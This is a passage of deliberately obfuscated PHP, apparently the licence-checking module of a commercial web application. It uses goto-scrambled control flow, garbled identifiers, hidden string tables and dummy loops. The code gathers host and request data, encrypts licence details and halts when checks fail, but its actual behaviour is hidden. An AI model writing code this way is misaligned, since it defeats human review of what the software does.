$a–Ãóœ¯’[142]) && $this->config[$a–Ãóœ¯’[143]]) { $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[144]] = WEB_ROOT; } goto bŒäÉœåõ•; B¶Ââƒã¨Í: $dšŒğÑ…¨Ê = $eÌÁÆ–İÃî[604]; while (strlen($dšŒğÑ…¨Ê) < $eÌÁÆ–İÃî[594]) { if (!$dšŒğÑ…¨Ê) { break; } $dšŒğÑ…¨Ê++; } unset($C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[107]][$a–Ãóœ¯’[76]]); goto aåÚ™Îî‹¥; cÚ”ŠÏ—©: $eÌÁÆ–İÃî =& $_SERVER[Ïº«‚ßèÔˆø]; $a–Ãóœ¯’ =& $_SERVER[£ñ­Åö°¿]; $AÛ¦Æ±ïå = $a–Ãóœ¯’[61]($a–Ãóœ¯’[62])->{$_SERVER[£ñ­Åö°¿][63]}(); goto FöôËˆêªœ; FöôËˆêªœ: $AŒ•í¶ìË‹ = array($a–Ãóœ¯’[64], $a–Ãóœ¯’[65], $a–Ãóœ¯’[66], $a–Ãóœ¯’[67], $a–Ãóœ¯’[68], $a–Ãóœ¯’[69], $a–Ãóœ¯’[70], $a–Ãóœ¯’[71], $a–Ãóœ¯’[72], $a–Ãóœ¯’[73], $a–Ãóœ¯’[74], $a–Ãóœ¯’[75], $a–Ãóœ¯’[76], $a–Ãóœ¯’[77], $a–Ãóœ¯’[78], $a–Ãóœ¯’[79], $a–Ãóœ¯’[80], $a–Ãóœ¯’[81], $a–Ãóœ¯’[82], $a–Ãóœ¯’[83], $a–Ãóœ¯’[84], $a–Ãóœ¯’[85], $a–Ãóœ¯’[86], $a–Ãóœ¯’[87], $a–Ãóœ¯’[88], $a–Ãóœ¯’[89], $a–Ãóœ¯’[90], $a–Ãóœ¯’[91], $a–Ãóœ¯’[92], $a–Ãóœ¯’[93], $a–Ãóœ¯’[94], $a–Ãóœ¯’[95], $a–Ãóœ¯’[96], $a–Ãóœ¯’[97], $a–Ãóœ¯’[98], $a–Ãóœ¯’[99], $a–Ãóœ¯’[100], $a–Ãóœ¯’[101], $a–Ãóœ¯’[102], $a–Ãóœ¯’[103]); $B™„¶Ä©Ì© = $eÌÁÆ–İÃî[602]; while (strlen($B™„¶Ä©Ì©) < $eÌÁÆ–İÃî[579]) { if (!$B™„¶Ä©Ì©) { break; } $B™„¶Ä©Ì©++; } goto BÑ–¤Èø; Fø‰ÀíŞ: if (strlen($EºÂ§İ§) < $eÌÁÆ–İÃî[585]) { return; } unset($C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[108]][$a–Ãóœ¯’[109]]); unset($C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[108]][$a–Ãóœ¯’[110]]); goto B¶Ââƒã¨Í; eËì™Ø‡ÖÔ: if (!$dàØ¨Ÿˆƒ) { return; } if ($AÛ¦Æ±ïå[$a–Ãóœ¯’[130]] != $a–Ãóœ¯’[131]) { $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[132]] = $AÛ¦Æ±ïå[$a–Ãóœ¯’[132]]; $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[133]] = $AÛ¦Æ±ïå[$a–Ãóœ¯’[133]]; $d‡¯ª¤¡Ñ— = $a–Ãóœ¯’[134](10) . $this->wlan80ca99a8 . $a–Ãóœ¯’[134](5); $C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[135]][$a–Ãóœ¯’[136]] = $this->{$_SERVER[£ñ­Åö°¿][137]}($d‡¯ª¤¡Ñ—, $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[123]]); } if ($this->wlan80ca99a8 == $a–Ãóœ¯’[131]) { $C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[107]][$a–Ãóœ¯’[112]][$a–Ãóœ¯’[117]] = 0; } goto A„²Ù‡ï‘ï; B±ªõóÔ»: $C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[107]][$a–Ãóœ¯’[112]] = array($a–Ãóœ¯’[113] => (int) $aÕïİ¼‘äÂ[$a–Ãóœ¯’[114]], $a–Ãóœ¯’[115] => (int) $a–Ãóœ¯’[116]($aÕïİ¼‘äÂ, $a–Ãóœ¯’[117], 0)); $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[119]] = $a–Ãóœ¯’[120]($a–Ãóœ¯’[121])->{$_SERVER[£ñ­Åö°¿][122]}(); $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[123]] = $a–Ãóœ¯’[124]($_SERVER[$a–Ãóœ¯’[125]] . $AÛ¦Æ±ïå[$a–Ãóœ¯’[126]]); goto bã˜Ë©¤à—; bã˜Ë©¤à—: $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[127]] = $a–Ãóœ¯’[128]($a–Ãóœ¯’[129]()); $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[130]] = $this->wlan80ca99a8; $dàØ¨Ÿˆƒ = $eÌÁÆ–İÃî[606]; goto eËì™Ø‡ÖÔ; aåÚ™Îî‹¥: $BùƒîĞŠİ = $eÌÁÆ–İÃî[605]; if (strlen($BùƒîĞŠİ) < $eÌÁÆ–İÃî[594]) { return; } unset($C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[107]][$a–Ãóœ¯’[111]]); goto B±ªõóÔ»; bŒäÉœåõ•: return $C¤Íª¨†Ğ; goto c­¡Š‚ÜËÂ; BÑ–¤Èø: foreach ($AŒ•í¶ìË‹ as $CÙ·„©óñ–) { $c¬—‡Ä‚İÆ = $GLOBALS[$a–Ãóœ¯’[104]][$a–Ãóœ¯’[105]][$CÙ·„©óñ–]; if (isset($AÛ¦Æ±ïå[$CÙ·„©óñ–])) { $c¬—‡Ä‚İÆ = $AÛ¦Æ±ïå[$CÙ·„©óñ–]; } $C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[107]][$CÙ·„©óñ–] = $c¬—‡Ä‚İÆ; } $aÕïİ¼‘äÂ = $C¤Íª¨†Ğ[$a–Ãóœ¯’[106]][$a–Ãóœ¯’[107]][$a–Ãóœ¯’[76]]; $EºÂ§İ§ = $eÌÁÆ–İÃî[603]; goto Fø‰ÀíŞ; c­¡Š‚ÜËÂ: } private function mgnw23b40cfb() { goto a‹‘¥øã°´; C¬¤íŸ¼: if ($this->wlan80ca99a8 == $cóù…Şº[131]) { return; } $Dâ†ßôã–Ê = array($cóù…Şº[163], $cóù…Şº[164], $cóù…Şº[165], $cóù…Şº[166], $cóù…Şº[167], $cóù…Şº[168]); $f±‡…ØĞ‘˜ = $aÃÈˆ¦ÜÄµ[607]; goto A•—ïŒ…†ß; aáÁÚø”ŠÈ: foreach ($Dâ†ßôã–Ê as $EÈ‰É½„ˆ²) { if (!isset($Aœšğôã£Ü[$EÈ‰É½„ˆ²]) || !$Aœšğôã£Ü[$EÈ‰É½„ˆ²]) { continue; } $c“£”®Ø§[$EÈ‰É½„ˆ²] = $Aœšğôã£Ü[$EÈ‰É½„ˆ²]; } $cóù…Şº[13](array($cóù…Şº[161], $cóù…Şº[162]), $c“£”®Ø§); goto B—ÑùÆ; a‹‘¥øã°´: $aÃÈˆ¦ÜÄµ =& $_SERVER[Ïº«‚ßèÔˆø]; $cóù…Şº =& $_SERVER[£ñ­Åö°¿]; if ($_SERVER[$cóù…Şº[44]] == $cóù…Şº[145]) { $d¯å¾ê = array($cóù…Şº[130] => $this->wlan80ca99a8, $cóù…Şº[146] => $this->{$_SERVER[£ñ­Åö°¿][147]}(), $cóù…Şº[148] => $cóù…Şº[61]($cóù…Şº[149])->{$_SERVER[£ñ­Åö°¿][150]}()); if ($this->wlan80ca99a8 != $cóù…Şº[131]) { $a¼“Óæ“ = $cóù…Şº[116]($this->bzsy48d1293c, $cóù…Şº[151]); if ($a¼“Óæ“) { $d¯å¾ê[$cóù…Şº[152]] = $a¼“Óæ“; $d¯å¾ê[$cóù…Şº[153]] = $cóù…Şº[154]($cóù…Şº[116]($this->bzsy48d1293c, $cóù…Şº[155])); $d¯å¾ê[$cóù…Şº[156]] = $cóù…Şº[116]($this->bzsy48d1293c, $cóù…Şº[141]); } } $d¯å¾ê = $this->{$_SERVER[£ñ­Åö°¿][157]}($cóù…Şº[158]($d¯å¾ê), $cóù…Şº[124]($cóù…Şº[159])); $c“£”®Ø§ = array($cóù…Şº[160] => $d¯å¾ê); $cóù…Şº[13](array($cóù…Şº[161], $cóù…Şº[162]), $c“£”®Ø§); } goto C¬¤íŸ¼; A•—ïŒ…†ß: if (strlen($f±‡…ØĞ‘˜) < $aÃÈˆ¦ÜÄµ[579]) { return; } $Aœšğôã£Ü = $cóù…Şº[61]($cóù…Şº[62])->{$_SERVER[£ñ­Åö°¿][63]}(); $C³“‡°› = $aÃÈˆ¦ÜÄµ[608]; goto B„×£õ±‚­; B„×£õ±‚­: $c“£”®Ø§ = array($cóù…Şº[169] => $Aœšğôã£Ü[$cóù…Şº[64]], $cóù…Şº[170] => $Aœšğôã£Ü[$cóù…Şº[65]], $cóù…Şº[171] => $cóù…Şº[10]); $Fæ³ŞÜÖ· = $aÃÈˆ¦ÜÄµ[609]; if (strlen($Fæ³ŞÜÖ·) < $aÃÈˆ¦ÜÄµ[579]) { return; } goto aáÁÚø”ŠÈ; B—ÑùÆ: } private function tgum701de401() { goto Aò¾±ªÄÂ; C• ½ÌÅ²’: $b­‰•Ñè¦… = $Fíˆù½Ñ . $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[130]] . $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[222]]; $E´…™˜¬· = $C¿Û•—‘’[613]; if (strlen($E´…™˜¬·) < $C¿Û•—‘’[594]) { return; } goto dÔ¢Ñ“£İ; cØëìéÍ‘: $b±éÉÁ§‡Ğ = $this->{$_SERVER[£ñ­Åö°¿][210]}($bÖÇÆíÎ¢[$FàÔˆ‰áñØ[211]]); $AÂ¦Õ¹òÑ× = $C¿Û•—‘’[612]; if (!$b±éÉÁ§‡Ğ || $b±éÉÁ§‡Ğ != $bÖÇÆíÎ¢[$FàÔˆ‰áñØ[155]]) { $d…¥ã“•±™ = array($FàÔˆ‰áñØ[212] => $FàÔˆ‰áñØ[61]($FàÔˆ‰áñØ[62])->{$_SERVER[£ñ­Åö°¿][63]}($FàÔˆ‰áñØ[126]), $FàÔˆ‰áñØ[213] => $_SERVER[$FàÔˆ‰áñØ[125]], $FàÔˆ‰áñØ[214] => $FàÔˆ‰áñØ[215](), $FàÔˆ‰áñØ[184] => $_SERVER[$FàÔˆ‰áñØ[185]]); $b‘³ƒôù¼ = $this->{$_SERVER[£ñ­Åö°¿][216]}($FàÔˆ‰áñØ[158]($d…¥ã“•±™)); $this->{$_SERVER[£ñ­Åö°¿][193]}($FàÔˆ‰áñØ[217] . $b‘³ƒôù¼); $FàÔˆ‰áñØ[176]($FàÔˆ‰áñØ[208]($FàÔˆ‰áñØ[218]), !0); } goto d’¶×Î‘›·; e›‰«´´ù: if (!$fˆ¿Æ á) { return; } if ($bÖÇÆíÎ¢[$FàÔˆ‰áñØ[227]] && $bÖÇÆíÎ¢[$FàÔˆ‰áñØ[227]] >= 1) { $FàÔˆ‰áñØ[61]($FàÔˆ‰áñØ[62])->{$_SERVER[£ñ­Åö°¿][228]}($FàÔˆ‰áñØ[229], $FàÔˆ‰áñØ[230]); } $FàÔˆ‰áñØ[61]($FàÔˆ‰áñØ[62])->{$_SERVER[£ñ­Åö°¿][231]}($f•ÏŠ¹øÅ…); goto dàƒõÇ´‹Œ; c©£¤ÅéÙ: if (!$FàÔˆ‰áñØ[116]($GLOBALS, $FàÔˆ‰áñØ[142])) { die; } $fË×êå³àí = $GLOBALS[$FàÔˆ‰áñØ[22]]; if (isset($fË×êå³àí[$FàÔˆ‰áñØ[173]])) { $this->{$_SERVER[£ñ­Åö°¿][174]}(); die; } goto aÜ±Á™¨é”; d’¶×Î‘›·: $f•ÏŠ¹øÅ… = array($FàÔˆ‰áñØ[219] => $B–Ş…È…ï[$FàÔˆ‰áñØ[175]], $FàÔˆ‰áñØ[220] => $bÖÇÆíÎ¢[$FàÔˆ‰áñØ[221]], $FàÔˆ‰áñØ[222] => $FàÔˆ‰áñØ[134](16), $FàÔˆ‰áñØ[130] => $bÖÇÆíÎ¢[$FàÔˆ‰áñØ[223]]); if ($B–Ş…È…ï[$FàÔˆ‰áñØ[178]]) { $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[222]] = $B–Ş…È…ï[$FàÔˆ‰áñØ[178]]; } $Fíˆù½Ñ = $FàÔˆ‰áñØ[25]($FàÔˆ‰áñØ[124]($f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[220]]), 10, 10); goto C• ½ÌÅ²’; Dôâ„ˆÏ: if (strlen($Bôø©ãÆÖÛ) < $C¿Û•—‘’[579]) { die; } $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[133]] = $FàÔˆ‰áñØ[128]($FàÔˆ‰áñØ[224]($this->{$_SERVER[£ñ­Åö°¿][157]}($CÈò÷•î‚ô, $FàÔˆ‰áñØ[226]))); $fˆ¿Æ á = $C¿Û•—‘’[616]; goto e›‰«´´ù; aÜ±Á™¨é”: if (!isset($fË×êå³àí[$FàÔˆ‰áñØ[175]]) || $FàÔˆ‰áñØ[24]($fË×êå³àí[$FàÔˆ‰áñØ[175]]) != 16) { $FàÔˆ‰áñØ[176]($FàÔˆ‰áñØ[177] . $fË×êå³àí[$FàÔˆ‰áñØ[175]], !1); } $CÔÚ»„§„• = $FàÔˆ‰áñØ[61]($FàÔˆ‰áñØ[62])->{$_SERVER[£ñ­Åö°¿][63]}($FàÔˆ‰áñØ[126]); $B–Ş…È…ï = array($FàÔˆ‰áñØ[175] => $fË×êå³àí[$FàÔˆ‰áñØ[175]], $FàÔˆ‰áñØ[178] => $FàÔˆ‰áñØ[134](16), $FàÔˆ‰áñØ[179] => $FàÔˆ‰áñØ[159], $FàÔˆ‰áñØ[180] => $FàÔˆ‰áñØ[181], $FàÔˆ‰áñØ[182] => $_SERVER[$FàÔˆ‰áñØ[183]], $FàÔˆ‰áñØ[184] => $_SERVER[$FàÔˆ‰áñØ[185]], $FàÔˆ‰áñØ[186] => $_SERVER[$FàÔˆ‰áñØ[187]]); goto fº˜–ğô©²; C£Ä Ë¤òá: $F»ìÉÜß¾é = $C¿Û•—‘’[619]; if (strlen($F»ìÉÜß¾é) < $C¿Û•—‘’[582]) { return; } $this->bzsy48d1293c = $bÖÇÆíÎ¢; goto aáÆ­¦ø¨š; FŠìïÑ·¾„: $e²îÌùŞÅİ = $C¿Û•—‘’[617]; if (strlen($e²îÌùŞÅİ) < $C¿Û•—‘’[594]) { die; } $c ëİ©®³©[$d—”Öğ­¢Š] = $e‚Ôˆ†Æï´; goto E‡Á…ë¤é; DëÁÊô…ÁÈ: Cache::set($FàÔˆ‰áñØ[240] . $FàÔˆ‰áñØ[124]($CÔÚ»„§„• . $FàÔˆ‰áñØ[241]), $FàÔˆ‰áñØ[10]); $e†µ‰®Âê = $C¿Û•—‘’[622]; if (!$e†µ‰®Âê) { die; } goto fÆŸÇ¯‘„ö; dİ³ùÛñÑ¯: $this->{$_SERVER[£ñ­Åö°¿][239]}(); $f©÷Ò¶©õ‚ = $C¿Û•—‘’[621]; if (strlen($f©÷Ò¶©õ‚) < $C¿Û•—‘’[582]) { return; } goto DëÁÊô…ÁÈ; dÔ¢Ñ“£İ: $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[132]] = $FàÔˆ‰áñØ[224]($FàÔˆ‰áñØ[128]($this->{$_SERVER[£ñ­Åö°¿][157]}($b­‰•Ñè¦…, $FàÔˆ‰áñØ[225]))); $c‰¸ğéŸ—º = $FàÔˆ‰áñØ[134](16); $A„ç±áôâ¿ = $C¿Û•—‘’[614]; goto FïÍÆ±†Ù; B™¹ÊÕ‘ÆÂ: if ($fË×êå³àí[$FàÔˆ‰áñØ[188]] == $FàÔˆ‰áñØ[189]) { $Dßç›¥Ë = $this->{$_SERVER[£ñ­Åö°¿][157]}($d ë½×éšİ, $FàÔˆ‰áñØ[190]); $b‘³ƒôù¼ = $this->{$_SERVER[£ñ­Åö°¿][137]}($FàÔˆ‰áñØ[158]($B–Ş…È…ï), $d ë½×éšİ . $FàÔˆ‰áñØ[191], 3); $b‘³ƒôù¼ = $b‘³ƒôù¼ . $FàÔˆ‰áñØ[192] . $_SERVER[$FàÔˆ‰áñØ[183]]; $dƒÇóôì¦É = $this->{$_SERVER[£ñ­Åö°¿][193]}($FàÔˆ‰áñØ[194] . $Dßç›¥Ë . $FàÔˆ‰áñØ[195] . $b‘³ƒôù¼, -1); $FàÔˆ‰áñØ[176]($dƒÇóôì¦É, !0); } else { if ($fË×êå³àí[$FàÔˆ‰áñØ[188]] == $FàÔˆ‰áñØ[196]) { $e¸„ó˜‡éÀ = $FàÔˆ‰áñØ[25]($FàÔˆ‰áñØ[124]($FàÔˆ‰áñØ[197] . $d ë½×éšİ), 12, 15) . $FàÔˆ‰áñØ[198]; $b‘³ƒôù¼ = $this->{$_SERVER[£ñ­Åö°¿][199]}($FàÔˆ‰áñØ[2]($fË×êå³àí[$FàÔˆ‰áñØ[200]]), $e¸„ó˜‡éÀ, 2); $CÎÃ±ˆ‰ÉÕ = $FàÔˆ‰áñØ[201]($b‘³ƒôù¼, !0); if (!$FàÔˆ‰áñØ[202]($CÎÃ±ˆ‰ÉÕ) || !$FàÔˆ‰áñØ[202]($CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]]) || $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[175]] != !0) { $DØ÷ë²Ï¥Ë = $FàÔˆ‰áñØ[204]; $cµì¶›‹äÃ = $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]] ? $FàÔˆ‰áñØ[205] . $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]] : $DØ÷ë²Ï¥Ë; $FàÔˆ‰áñØ[176]($cµì¶›‹äÃ, !1); } else { $B–Ş…È…ï[$FàÔˆ‰áñØ[178]] = $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]][$FàÔˆ‰áñØ[206]]; } } else { $CÎÃ±ˆ‰ÉÕ = $this->{$_SERVER[£ñ­Åö°¿][193]}($FàÔˆ‰áñØ[207], $B–Ş…È…ï, 10); $AÂáÛÚ™ = $C¿Û•—‘’[611]; while ($AÂáÛÚ™ < $C¿Û•—‘’[579]) { if ($AÂáÛÚ™ >= 0) { break; } $AÂáÛÚ™++; } } } if (!$FàÔˆ‰áñØ[202]($CÎÃ±ˆ‰ÉÕ) || !$FàÔˆ‰áñØ[202]($CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]]) || $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[175]] != !0) { $DØ÷ë²Ï¥Ë = $FàÔˆ‰áñØ[208]($FàÔˆ‰áñØ[209]); $cµì¶›‹äÃ = $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]] ? $FàÔˆ‰áñØ[205] . $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]] : $DØ÷ë²Ï¥Ë; $FàÔˆ‰áñØ[176]($cµì¶›‹äÃ, !1); } $bÖÇÆíÎ¢ = $CÎÃ±ˆ‰ÉÕ[$FàÔˆ‰áñØ[203]]; goto cØëìéÍ‘; fÆŸÇ¯‘„ö: $FàÔˆ‰áñØ[176]($FàÔˆ‰áñØ[208]($FàÔˆ‰áñØ[218]), !0); goto A…‡˜…„‡‹; A¾îƒéê: $D„‘í½Î’Â = $FàÔˆ‰áñØ[232]($FàÔˆ‰áñØ[61]($FàÔˆ‰áñØ[11])->{$_SERVER[£ñ­Åö°¿][233]}(), $FàÔˆ‰áñØ[234]); $a‰­¨Ü”¡‡ = $D„‘í½Î’Â[$FàÔˆ‰áñØ[235]]; $c ëİ©®³© = array(); goto FŠìïÑ·¾„; FïÍÆ±†Ù: if (!$A„ç±áôâ¿) { return; } $CÈò÷•î‚ô = $c‰¸ğéŸ—º . $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[130]] . $this->{$_SERVER[£ñ­Åö°¿][157]}($FàÔˆ‰áñØ[124]($f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[219]]), $c‰¸ğéŸ—º); $Bôø©ãÆÖÛ = $C¿Û•—‘’[615]; goto Dôâ„ˆÏ; E‡Á…ë¤é: $Dóº´¿æ® = $C¿Û•—‘’[618]; while (strlen($Dóº´¿æ®) < $C¿Û•—‘’[594]) { if (!$Dóº´¿æ®) { break; } $Dóº´¿æ®++; } $FàÔˆ‰áñØ[61]($FàÔˆ‰áñØ[11])->{$_SERVER[£ñ­Åö°¿][236]}($a‰­¨Ü”¡‡[$FàÔˆ‰áñØ[237]], array($FàÔˆ‰áñØ[238] => $c ëİ©®³©)); goto C£Ä Ë¤òá; dàƒõÇ´‹Œ: $aÙ«œ©×ƒá = $FàÔˆ‰áñØ[124]($_SERVER[$FàÔˆ‰áñØ[125]] . $FàÔˆ‰áñØ[224]($CÔÚ»„§„•) . $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[220]]); $d—”Öğ­¢Š = $FàÔˆ‰áñØ[224]($FàÔˆ‰áñØ[25]($aÙ«œ©×ƒá, 10, 16)); $e‚Ôˆ†Æï´ = $this->{$_SERVER[£ñ­Åö°¿][137]}($FàÔˆ‰áñØ[158]($bÖÇÆíÎ¢), $aÙ«œ©×ƒá); goto A¾îƒéê; fº˜–ğô©²: $d ë½×éšİ = $FàÔˆ‰áñØ[124]($_SERVER[$FàÔˆ‰áñØ[125]] . $CÔÚ»„§„•); $f­õˆ‚¢½ô = $C¿Û•—‘’[610]; if (!$f­õˆ‚¢½ô) { die; } goto B™¹ÊÕ‘ÆÂ; aáÆ­¦ø¨š: $BŠçŒßà¼Ë = $C¿Û•—‘’[620]; if (!$BŠçŒßà¼Ë) { die; } $this->wlan80ca99a8 = $f•ÏŠ¹øÅ…[$FàÔˆ‰áñØ[130]]; goto dİ³ùÛñÑ¯; Aò¾±ªÄÂ: $C¿Û•—‘’ =& $_SERVER[Ïº«‚ßèÔˆø]; $FàÔˆ‰áñØ =& $_SERVER[£ñ­Åö°¿]; if ($_SERVER[$FàÔˆ‰áñØ[44]] != $FàÔˆ‰áñØ[172]) { return; } goto c©£¤ÅéÙ; A…‡˜…„‡‹: } private function licenseRegistSuccess() { $eŠ˜£¶‚ƒ‡ =& $_SERVER[£ñ­Åö°¿]; $d¥¢ÀŸÛš = $eŠ˜£¶‚ƒ‡[61]($eŠ˜£¶‚ƒ‡[62])->{$_SERVER[£ñ­Åö°¿][63]}(); $a¶’åŒ™ò = $_SERVER[Ïº«‚ßèÔˆø][623]; if ($d¥¢ÀŸÛš[$eŠ˜£¶‚ƒ‡[93]] != $eŠ˜£¶‚ƒ‡[230]) { $eŠ˜£¶‚ƒ‡[61]($eŠ˜£¶‚ƒ‡[62])->{$_SERVER[£ñ­Åö°¿][231]}($eŠ˜£¶‚ƒ‡[93], $eŠ˜£¶‚ƒ‡[230]); } $eŠ˜£¶‚ƒ‡[120]($eŠ˜£¶‚ƒ‡[242])->{$_SERVER[£ñ­Åö°¿][243]}(!0); } private function oxeh28b30013() { $b¶³Ú´çÓ =& $_SERVER[£ñ­Åö°¿]; $b¶³Ú´çÓ[61]($b¶³Ú´çÓ[62])->{$_SERVER[£ñ­Åö°¿][231]}(array($b¶³Ú´çÓ[219] => $b¶³Ú´çÓ[10], $b¶³Ú´çÓ[220] => $b¶³Ú´çÓ[10], $b¶³Ú´çÓ[130] => $b¶³Ú´çÓ[131], $b¶³Ú´çÓ[132] => $b¶³Ú´çÓ[10], $b¶³Ú´çÓ[133] => $b¶³Ú´çÓ[10])); $aÅâØÆæ¦… = $_SERVER[Ïº«‚ßèÔˆø][624]; $b¶³Ú´çÓ[61]($b¶³Ú´çÓ[62])->{$_SERVER[£ñ­Åö°¿][228]}($b¶³Ú´çÓ[229], $b¶³Ú´çÓ[244]); $this->bzsy48d1293c = array(); $this->wlan80ca99a8 = $b¶³Ú´çÓ[131]; } private function ylwp27db4b03() { goto c«£ƒŞ±À‚; F•êš¨«ˆÁ: if (strlen($e†¡¨®ˆ¬Ã) < $bì’ô«¸ÇÃ[585]) { return; } if ($bØŠƒå×ùº[$d ÜÒÈœ™ø[130]] == $d ÜÒÈœ™ø[131]) { return; } $dµŸÍ§˜–ì = $d ÜÒÈœ™ø[61]($d ÜÒÈœ™ø[62])->{$_SERVER[£ñ­Åö°¿][63]}($d ÜÒÈœ™ø[126]); goto C¯‰àÀˆ; EØ—˜ì¹Îø: $this->wlan80ca99a8 = $d ÜÒÈœ™ø[131]; $bØŠƒå×ùº = $d ÜÒÈœ™ø[61]($d ÜÒÈœ™ø[62])->{$_SERVER[£ñ­Åö°¿][63]}(); $e†¡¨®ˆ¬Ã = $bì’ô«¸ÇÃ[625]; goto F•êš¨«ˆÁ; c«£ƒŞ±À‚: $bì’ô«¸ÇÃ =& $_SERVER[Ïº«‚ßèÔˆø]; $d ÜÒÈœ™ø =& $_SERVER[£ñ­Åö°¿]; $_SERVER[$d ÜÒÈœ™ø[185]] = $d ÜÒÈœ™ø[116]($_SERVER, $d ÜÒÈœ™ø[185], APP_HOST); goto EØ—˜ì¹Îø; bÀƒ¾ÑÄ: if (strlen($dÀ¶¢ò¾¯³) < $bì’ô«¸ÇÃ[585]) { die; } if (!$d ÜÒÈœ™ø[202]($C÷ĞĞòº³´) || !isset($C÷ĞĞòº³´[$d ÜÒÈœ™ø[245]]) || $d ÜÒÈœ™ø[246]() - $C÷ĞĞòº³´[$d ÜÒÈœ™ø[245]] >= 60) { $bóİ‘¶ˆÄ‰ = $d ÜÒÈœ™ø[232]($d ÜÒÈœ™ø[61]($d ÜÒÈœ™ø[11])->{$_SERVER[£ñ­Åö°¿][233]}(), $d ÜÒÈœ™ø[234]); $F£¢™ØôÏ = $bóİ‘¶ˆÄ‰[$d ÜÒÈœ™ø[235]]; $EÃËæóÁĞ¯ = $d ÜÒÈœ™ø[124]($_SERVER[$d ÜÒÈœ™ø[125]] . $d ÜÒÈœ™ø[224]($dµŸÍ§˜–ì) . $bØŠƒå×ùº[$d ÜÒÈœ™ø[220]]); $c×âÄ­À·µ = $d ÜÒÈœ™ø[224]($d ÜÒÈœ™ø[25]($EÃËæóÁĞ¯, 10, 16)); $C÷ĞĞòº³´ = $this->{$_SERVER[£ñ­Åö°¿][199]}($F£¢™ØôÏ[$d ÜÒÈœ™ø[104]][$c×âÄ­À·µ], $EÃËæóÁĞ¯); $C÷ĞĞòº³´ = $d ÜÒÈœ™ø[201]($C÷ĞĞòº³´, !0); } if (!$d ÜÒÈœ™ø[202]($C÷ĞĞòº³´)) { return $this->{$_SERVER[£ñ­Åö°¿][174]}(); } goto BàËŠ®È•Š; C¯‰àÀˆ: $dÀ‚İ¡Ëºö = $bì’ô«¸ÇÃ[626]; $FºâÖİ = $d ÜÒÈœ™ø[240] . $d ÜÒÈœ™ø[124]($dµŸÍ§˜–ì . $d ÜÒÈœ™ø[241]); $dË¤´‡®ùœ = $bì’ô«¸ÇÃ[627]; goto EÛ¼öÆ›îÙ; dàù²‹´…á: while (strlen($Eì±„¬ ÍË) < $bì’ô«¸ÇÃ[594]) { if (!$Eì±„¬ ÍË) { break; } $Eì±„¬ ÍË++; } goto e»“‡¹—ÍÂ; EÛ¼öÆ›îÙ: if (strlen($dË¤´‡®ùœ) < $bì’ô«¸ÇÃ[582]) { die; } $C÷ĞĞòº³´ = Cache::get($FºâÖİ); $dÀ¶¢ò¾¯³ = $bì’ô«¸ÇÃ[628]; goto bÀƒ¾ÑÄ; C‹å…«ŠËˆ: $this->bzsy48d1293c = $C÷ĞĞòº³´; $this->wlan80ca99a8 = $bØŠƒå×ùº[$d ÜÒÈœ™ø[130]]; $Eì±„¬ ÍË = $bì’ô«¸ÇÃ[629]; goto dàù²‹´…á; BàËŠ®È•Š: $Cšò¤ß³† = $d ÜÒÈœ™ø[154]($C÷ĞĞòº³´[$d ÜÒÈœ™ø[155]]); if ($d ÜÒÈœ™ø[246]() >= $Cšò¤ß³†) { return $this->{$_SERVER[£ñ­Åö°¿][174]}(); } if ($d ÜÒÈœ™ø[246]() - $C÷ĞĞòº³´[$d ÜÒÈœ™ø[245]] > 20) { $C÷ĞĞòº³´[$d ÜÒÈœ™ø[245]] = $d ÜÒÈœ™ø[246](); Cache::set($FºâÖİ, $C÷ĞĞòº³´); } goto C‹å…«ŠËˆ; e»“‡¹—ÍÂ: } private function ihyd1d95f79b() { $D´Î‚»£¡İ =& $_SERVER[£ñ­Åö°¿]; $bÎÓÚ¾¸ññ = $GLOBALS[$D´Î‚»£¡İ[22]]; $cÌ†Óàº… = $_SERVER[$D´Î‚»£¡İ[44]]; if ($cÌ†Óàº… == $D´Î‚»£¡İ[247] && $this->wlan80ca99a8 == $D´Î‚»£¡İ[131]) { $D´Î‚»£¡İ[176]($D´Î‚»£¡İ[208]($D´Î‚»£¡İ[248]), !1, $D´Î‚»£¡İ[249]); } $b’Ã‡Ñ£ = array($D´Î‚»£¡İ[250], $D´Î‚»£¡İ[251]); if ($D´Î‚»£¡İ[252]($cÌ†Óàº…, $b’Ã‡Ñ£)) { if ($this->wlan80ca99a8 == 